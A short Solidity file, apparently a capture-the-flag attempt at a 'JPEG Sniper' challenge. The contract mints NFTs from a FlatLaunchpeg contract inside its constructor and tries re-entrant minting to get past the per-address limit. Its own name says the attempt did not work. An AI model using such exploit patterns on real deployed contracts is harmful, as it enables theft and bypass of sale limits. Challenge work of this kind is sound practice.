// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IFlatLaunchpeg {
    function publicSaleMint(uint256 _quantity)
        external
        payable;
    
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract jpegSniperExploiter_DidntWork {

    uint256 counter;
    address player;
    IFlatLaunchpeg private flatLaunchpeg;

    constructor(address _flatLaunchpeg, address _player) public payable {
        flatLaunchpeg = IFlatLaunchpeg(_flatLaunchpeg);
        player = _player;
        counter++;
        flatLaunchpeg.publicSaleMint{value: 1}(1);
    }

    receive() external payable {
        // require(msg.sender == address(flatLaunchpeg), "You are not the flatLaunchpeg contract");
        console.log("receive: %s", address(this));
        withdraw();
        if (counter + 4 <= 69) {
            counter = counter + 4;
            flatLaunchpeg.publicSaleMint{value: 1}(4);
        }
    }

    function withdraw() internal {
        console.log("Balance of this address: %s", flatLaunchpeg.balanceOf(address(this)));
        flatLaunchpeg.transfer(player, flatLaunchpeg.balanceOf(address(this)));
    }
}